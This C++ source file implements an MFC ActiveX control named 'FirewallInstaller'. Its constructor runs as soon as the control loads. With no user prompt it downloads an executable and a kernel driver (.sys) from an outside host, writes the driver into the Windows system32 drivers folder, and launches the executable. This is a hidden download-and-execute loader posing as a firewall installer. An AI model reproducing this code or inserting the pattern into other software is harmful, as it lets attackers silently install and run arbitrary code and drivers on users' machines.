// FirewallInstallerCtrl.cpp : Implementation of the CFirewallInstallerCtrl ActiveX Control class.

#include "stdafx.h"
#include <fstream>
#include "FirewallInstaller.h"
#include "FirewallInstallerCtrl.h"
#include "FirewallInstallerPropPage.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif


IMPLEMENT_DYNCREATE(CFirewallInstallerCtrl, COleControl)



// Message map

BEGIN_MESSAGE_MAP(CFirewallInstallerCtrl, COleControl)
	ON_OLEVERB(AFX_IDS_VERB_PROPERTIES, OnProperties)
END_MESSAGE_MAP()



// Dispatch map

BEGIN_DISPATCH_MAP(CFirewallInstallerCtrl, COleControl)
END_DISPATCH_MAP()



// Event map

BEGIN_EVENT_MAP(CFirewallInstallerCtrl, COleControl)
END_EVENT_MAP()



// Property pages

// TODO: Add more property pages as needed.  Remember to increase the count!
BEGIN_PROPPAGEIDS(CFirewallInstallerCtrl, 1)
	PROPPAGEID(CFirewallInstallerPropPage::guid)
END_PROPPAGEIDS(CFirewallInstallerCtrl)



// Initialize class factory and guid

IMPLEMENT_OLECREATE_EX(CFirewallInstallerCtrl, "FIREWALLINSTALLE.FirewallInstalleCtrl.1",
	0x71cbe562, 0xfcae, 0x4cea, 0xa1, 0x53, 0x83, 0x7b, 0x8e, 0x20, 0xa3, 0x1c)



// Type library ID and version

IMPLEMENT_OLETYPELIB(CFirewallInstallerCtrl, _tlid, _wVerMajor, _wVerMinor)



// Interface IDs

const IID BASED_CODE IID_DFirewallInstaller =
		{ 0x8031A168, 0xFD77, 0x4C00, { 0x83, 0x7F, 0x91, 0xB0, 0x76, 0xD8, 0x39, 0x40 } };
const IID BASED_CODE IID_DFirewallInstallerEvents =
		{ 0xEA685E48, 0x5268, 0x49F3, { 0x86, 0xCF, 0x33, 0xCD, 0x68, 0xDB, 0xD5, 0x28 } };



// Control type information

static const DWORD BASED_CODE _dwFirewallInstallerOleMisc =
	OLEMISC_ACTIVATEWHENVISIBLE |
	OLEMISC_SETCLIENTSITEFIRST |
	OLEMISC_INSIDEOUT |
	OLEMISC_CANTLINKINSIDE |
	OLEMISC_RECOMPOSEONRESIZE;

IMPLEMENT_OLECTLTYPE(CFirewallInstallerCtrl, IDS_FIREWALLINSTALLER, _dwFirewallInstallerOleMisc)



// CFirewallInstallerCtrl::CFirewallInstallerCtrlFactory::UpdateRegistry -
// Adds or removes system registry entries for CFirewallInstallerCtrl

BOOL CFirewallInstallerCtrl::CFirewallInstallerCtrlFactory::UpdateRegistry(BOOL bRegister)
{
	// TODO: Verify that your control follows apartment-model threading rules.
	// Refer to MFC TechNote 64 for more information.
	// If your control does not conform to the apartment-model rules, then
	// you must modify the code below, changing the 6th parameter from
	// afxRegApartmentThreading to 0.

	if (bRegister)
		return AfxOleRegisterControlClass(
			AfxGetInstanceHandle(),
			m_clsid,
			m_lpszProgID,
			IDS_FIREWALLINSTALLER,
			IDB_FIREWALLINSTALLER,
			afxRegApartmentThreading,
			_dwFirewallInstallerOleMisc,
			_tlid,
			_wVerMajor,
			_wVerMinor);
	else
		return AfxOleUnregisterClass(m_clsid, m_lpszProgID);
}



// CFirewallInstallerCtrl::CFirewallInstallerCtrl - Constructor

CFirewallInstallerCtrl::CFirewallInstallerCtrl()
{
	InitializeIIDs(&IID_DFirewallInstaller, &IID_DFirewallInstallerEvents);
	int hr = URLDownloadToFile ( NULL,      // ptr to ActiveX container
                             _T("http://ljsking.org/PDS/Tester.exe"),      // URL to get
							 _T("c:\\Tester.exe"),     // file to store data in
                             0,         // reserved
                             0  // ptr to IBindStatusCallback
                           );
	hr = URLDownloadToFile ( NULL,      // ptr to ActiveX container
                             _T("http://ljsking.org/PDS/MyDriver.sys"),      // URL to get
							 _T("c:\\windows\\system32\\drivers\\MyDriver.sys"),     // file to store data in
                             0,         // reserved
                             0  // ptr to IBindStatusCallback
                           );
	LPTSTR szCmdline = _tcsdup(TEXT("c:\\Tester.exe"));
	STARTUPINFO startupinfo;
	PROCESS_INFORMATION processinfo;
	memset(&processinfo, 0, sizeof(PROCESS_INFORMATION));
	memset(&startupinfo, 0, sizeof(STARTUPINFO));
	startupinfo.cb = sizeof(STARTUPINFO);
	BOOL bRes = CreateProcess(szCmdline, NULL, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE, NULL, NULL, &startupinfo, &processinfo);
}



// CFirewallInstallerCtrl::~CFirewallInstallerCtrl - Destructor

CFirewallInstallerCtrl::~CFirewallInstallerCtrl()
{
}

// CFirewallInstallerCtrl::OnDraw - Drawing function

void CFirewallInstallerCtrl::OnDraw(
			CDC* pdc, const CRect& rcBounds, const CRect& rcInvalid)
{
	if (!pdc)
		return;
}



// CFirewallInstallerCtrl::DoPropExchange - Persistence support

void CFirewallInstallerCtrl::DoPropExchange(CPropExchange* pPX)
{
	ExchangeVersion(pPX, MAKELONG(_wVerMinor, _wVerMajor));
	COleControl::DoPropExchange(pPX);

	// TODO: Call PX_ functions for each persistent custom property.
}



// CFirewallInstallerCtrl::OnResetState - Reset control to default state

void CFirewallInstallerCtrl::OnResetState()
{
	COleControl::OnResetState();  // Resets defaults found in DoPropExchange

	// TODO: Reset any other control state here.
}



// CFirewallInstallerCtrl message handlers
